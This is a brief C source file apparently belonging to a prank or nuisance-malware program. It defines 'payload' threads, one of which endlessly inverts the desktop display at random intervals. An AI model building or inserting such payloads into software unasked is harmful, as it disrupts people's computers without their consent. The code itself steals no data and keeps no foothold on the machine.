#include "payloads.h"

THREAD(emptyPayload) {
	// An empty payload to go on
	PAYLOADFOOT
}

THREAD(invertPayload) {
	// A classic...
	// Inspired by Zika

	while (TRUE) {
		HDC hdcDesktop;
		hdcDesktop = GetDC(DESKTOP_WINDOW);

		for (int i = 0; i < nHeight; i++) {
			BitBlt(hdcDesktop, 0, i, nWidth, 1, hdcDesktop, 0, i, NOTSRCCOPY);
		}

		ReleaseDC(0, hdcDesktop);

		Sleep((rand() % 60000) + 1);
	}

	PAYLOADFOOT
}
